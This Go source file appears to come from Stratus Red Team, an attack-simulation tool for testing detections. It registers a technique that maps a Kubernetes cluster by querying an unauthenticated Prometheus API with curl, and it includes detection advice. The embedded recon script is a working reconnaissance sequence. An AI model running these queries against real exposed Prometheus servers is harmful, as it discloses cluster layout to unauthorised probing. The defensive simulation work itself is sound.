package kubernetes

import (
	"context"
	_ "embed"
	"fmt"
	"time"

	"github.com/aws/smithy-go/ptr"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/log"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

//go:embed main.tf
var tf []byte

const (
	codeBlock            = "```"
	techniqueID          = "k8s.discovery.prometheus-cluster-recon"
	reconQueriesFileName = "recon.sh"
)

// reconScript performs the article's attack sequence entirely over the
// Prometheus HTTP API, without making any Kubernetes API call.
const reconScript = `set -e
PROM="http://prometheus-server:9090"
echo "=== Health check (unauthenticated) ==="
curl -s "$PROM/-/healthy"
echo "=== Enumerating scrape targets (/api/v1/targets) ==="
curl -s "$PROM/api/v1/targets"
echo
echo "=== Harvesting container images and versions ==="
curl -s "$PROM/api/v1/query?query=kube_pod_container_info"
echo
echo "=== Mapping internal services ==="
curl -s "$PROM/api/v1/query?query=kube_service_info"
echo
echo "=== Extracting node details ==="
curl -s "$PROM/api/v1/query?query=kube_node_info"
echo
echo "Prometheus reconnaissance completed"
`

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           techniqueID,
		FriendlyName: "Perform Cluster Reconnaissance via Prometheus",
		Platform:     stratus.Kubernetes,
		IsIdempotent: false,
		MitreAttackTactics: []mitreattack.Tactic{
			mitreattack.Discovery,
		},
		Description: `
Performs cluster reconnaissance by querying an unauthenticated Prometheus HTTP API endpoint, without touching the Kubernetes API.

Prometheus ships with no authentication enabled by default: the HTTP query API on port <code>9090</code> is accessible to anyone who can reach the service. Because kube-state-metrics translates Kubernetes object state into labeled time series, a single set of HTTP queries exposes the full cluster map — every monitored component and its namespace, every running container's image and version, every Service's cluster IP, and node details such as kernel version, container runtime, pod CIDR, and system UUID. The critical characteristic is that the discovery requires <b>zero Kubernetes API calls</b>: the Kubernetes API server audit log records nothing.

This technique is designed for local simulation.

Warm-up:

- Create a namespace.
- Deploy a mock unauthenticated "Prometheus" API (nginx serving <code>/api/v1/targets</code>, <code>/api/v1/query</code> and <code>/-/healthy</code>) backed by realistic kube-state-metrics series describing pods, services, and nodes, reachable at <code>prometheus-server.&lt;ns&gt;.svc.cluster.local:9090</code> without any authentication.

Detonation:

- Run a recon pod that locates the Prometheus service (via the injected <code>PROMETHEUS_SERVER_SERVICE_HOST</code>/<code>_PORT</code> environment variables) and executes the attack sequence against the Prometheus HTTP API: health check, target enumeration, and <code>kube_pod_container_info</code>, <code>kube_service_info</code>, and <code>kube_node_info</code> queries. The pod makes no Kubernetes API calls — its ServiceAccount token is intentionally left unmounted.

References:

- https://kubernetes-security.cloud/topics/cluster-reconnaissance-via-prometheus
- https://prometheus.io/docs/prometheus/latest/querying/api/
- https://www.sysdig.com/blog/exposed-prometheus-exploit-kubernetes-kubeconeu
`,
		Detection: `
Because this technique generates no Kubernetes API server audit events, detection must happen at the network or Prometheus level:

<ul>
<li>Monitor Prometheus HTTP access logs for requests to <code>/api/v1/query</code> and <code>/api/v1/targets</code> from unexpected source pods or namespaces — especially queries for <code>kube_pod_container_info</code>, <code>kube_service_info</code>, and <code>kube_node_info</code>, which a legitimate dashboard rarely fetches in bulk from an unknown client.</li>
<li>Alert on the absence of authentication: verify Prometheus is configured with <code>--web.config.file</code> (TLS/basic auth) or is fronted by an authenticating reverse proxy; an unauthenticated 200 response to <code>/-/healthy</code> from a non-scrape source is a red flag.</li>
<li>Use NetworkPolicies to restrict ingress to the Prometheus Service to known scraper or dashboard namespaces; a NetworkPolicy <code>deny</code> event for a random pod attempting port 9090 is a strong signal.</li>
<li>Watch for recon pods performing DNS lookups for <code>prometheus-server</code> or reading injected <code>PROMETHEUS_*</code> environment variables, e.g. via eBPF-based runtime sensors.</li>
</ul>
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

// buildReconPod returns the attacker's recon pod. It runs the recon script
// against the unauthenticated Prometheus API and streams the results to the
// container log. No Kubernetes API calls are made: automountServiceAccountToken
// is explicitly disabled.
func buildReconPod(namespace string, name string, correlationID string) *v1.Pod {
	return &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: namespace,
			Labels: map[string]string{
				"datadoghq.com/stratus-red-team":                "true",
				"datadoghq.com/stratus-red-team-correlation-id": correlationID,
				"datadoghq.com/stratus-red-team-stage":          "detonation",
			},
		},
		Spec: v1.PodSpec{
			// The point of the technique: recon without touching the Kubernetes API
			AutomountServiceAccountToken: ptr.Bool(false),
			RestartPolicy:                v1.RestartPolicyNever,
			Containers: []v1.Container{{
				Name:    "recon",
				Image:   "curlimages/curl:8.11.1",
				Command: []string{"sh", "-c"},
				Args:    []string{"cat /scripts/" + reconQueriesFileName + " > /tmp/recon.sh && sh /tmp/recon.sh"},
				VolumeMounts: []v1.VolumeMount{{
					Name:      "recon-scripts",
					MountPath: "/scripts",
					ReadOnly:  true,
				}},
			}},
			Volumes: []v1.Volume{{
				Name: "recon-scripts",
				VolumeSource: v1.VolumeSource{
					ConfigMap: &v1.ConfigMapVolumeSource{
						LocalObjectReference: v1.LocalObjectReference{Name: name},
						DefaultMode:          ptr.Int32(0755),
					},
				},
			}},
			ActiveDeadlineSeconds: ptr.Int64(120),
		},
	}
}

func reconPodName(params map[string]string) string {
	name := techniqueID
	if params["warmup_short_id"] != "" {
		name = name + "-" + params["warmup_short_id"]
	}
	return name
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	name := reconPodName(params)
	correlationID := providers.K8s().UniqueCorrelationId.String()

	providers.K8s().ApplyPodConfig(techniqueID, buildReconPod(namespace, name, correlationID))

	log.Println("Creating recon ConfigMap " + name + " in namespace " + namespace)
	_, err := client.CoreV1().ConfigMaps(namespace).Create(context.Background(), &v1.ConfigMap{
		ObjectMeta: metav1.ObjectMeta{
			Name:      name,
			Namespace: namespace,
			Labels: map[string]string{
				"datadoghq.com/stratus-red-team":                "true",
				"datadoghq.com/stratus-red-team-correlation-id": correlationID,
				"datadoghq.com/stratus-red-team-stage":          "detonation",
			},
		},
		Data: map[string]string{reconQueriesFileName: reconScript},
	}, metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create recon ConfigMap: %w", err)
	}

	log.Println("Creating recon pod " + name + " in namespace " + namespace)
	_, err = client.CoreV1().Pods(namespace).Create(context.Background(), buildReconPod(namespace, name, correlationID), metav1.CreateOptions{})
	if err != nil {
		return fmt.Errorf("unable to create recon pod: %w", err)
	}

	// Wait for the recon pod to complete and surface the harvested data in the log
	log.Println("Waiting for recon pod " + name + " to complete (this may take a minute to pull the image)")
	deadline := time.Now().Add(90 * time.Second)
	for {
		pod, err := client.CoreV1().Pods(namespace).Get(context.Background(), name, metav1.GetOptions{})
		if err != nil {
			return fmt.Errorf("unable to get recon pod status: %w", err)
		}
		if pod.Status.Phase == v1.PodSucceeded {
			log.Println("Prometheus reconnaissance completed: cluster topology harvested without any Kubernetes API call")
			return nil
		}
		if pod.Status.Phase == v1.PodFailed {
			return fmt.Errorf("recon pod failed")
		}
		if time.Now().After(deadline) {
			return fmt.Errorf("recon pod did not complete within 90 seconds (current phase: %s)", pod.Status.Phase)
		}
		time.Sleep(2 * time.Second)
	}
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	name := reconPodName(params)
	deleteOptions := metav1.DeleteOptions{GracePeriodSeconds: ptr.Int64(0)}

	log.Println("Removing recon pod " + name)
	err := client.CoreV1().Pods(namespace).Delete(context.Background(), name, deleteOptions)
	if err != nil {
		return fmt.Errorf("unable to remove recon pod: %w", err)
	}

	log.Println("Removing recon ConfigMap " + name)
	err = client.CoreV1().ConfigMaps(namespace).Delete(context.Background(), name, metav1.DeleteOptions{})
	if err != nil {
		return fmt.Errorf("unable to remove recon ConfigMap: %w", err)
	}

	return nil
}
